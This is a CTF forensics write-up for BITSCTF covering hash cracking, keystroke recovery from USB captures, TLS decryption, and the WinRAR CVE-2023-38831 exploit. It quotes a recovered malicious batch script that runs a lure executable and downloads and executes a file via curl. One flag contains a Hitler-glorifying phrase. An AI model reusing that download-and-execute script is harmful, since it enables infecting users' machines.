# ACCESS GRANTED

All I did was dump the hash dumps from memory images using `Volatility 3` and crack the NTLM hashes using `CrackStation`.
> FLAG -> BITSCTF{adolfhitlerrulesallthepeople}


# 0.69 DAY
Exploring the WinRAR vulnerability which executes steps.pdf.bat malicious file when it is extracted. 
If we search under MogamBro's user directory in the disk dump, we find MogamBro/AppData/Roaming/WinRAR.
And also under Downloads a zip folder Follow these instructions.

```
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
lottery.exe & start chrome -incognito https://pastebin.com/mPvzn0AD & notepad.exe secret.png.enc & curl google.com -o steps.pdf & steps.pdf
exit
```
> FLAG -> BITSCTF{CVE-2023-38831}


# MOGAMBRO's GUILTY PLEASURE
When we open the YOU WON A LOTTERY eml file under Outlook it matches the downloads file `lottery.exe` which is just a mere distraction.

However the other link 50% discount on plushies is a `spam mimic link` and has hidden flag behind it.	

> FLAG -> BITSCTF{sp4m_2_ph1sh_U}

# I'M WIRED IN 

To obtain the flag, we need to analyze the user's keystroke history.

Upon inspecting the image, I discovered a `keylog.pcapng` file and a `key` file located in the Desktop directory of MogamBro. After extracting and analyzing the `pcapng` file, I identified USB traffic.

By researching USB packet analysis online, I came across a repository called **USBKeyTranslator**, which can be used to retrieve HID data from USB packets.


```
$ python USBkeysTranslator.py keylog.pcapng 

[+] Using filter "usbhid.data" Retrived HID Data is :

I haveebeen haakee  !!!
HELLMEE
BITSCTF{I_-7h1nk_th3y_4Re_k3yl0991ng_ME!}

 MogamBro
```

> FLAG -> BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}

# ByPassing Transport Layer
I found TLS keys in the Desktop directory of MogamBro. By analyzing the PowerShell history in the AD1 image, it becomes evident that a series of commands were used to set up environment variables for logging SSL/TLS keys, capture network traffic, and save the data into the provided pcap file. These keys can be used to decrypt the TLS packets.  

Using Wireshark, I imported the key file into the pcap file to reveal the decrypted packets. This can be done by navigating to **Edit > Preferences > Protocols > TLS**, browsing for the key file, and applying it. Wireshark then displays the decrypted packets.  

While examining the pcap file, I observed HTTP/2 packets containing images, GIFs, and other files (many of which included inappropriate content). These files can be exported. Additionally, tools like `strings` can be used to extract the flag name.

```
strings ./* | grep -i "BITSCTF"
BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}
```
> FLAG -> BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}
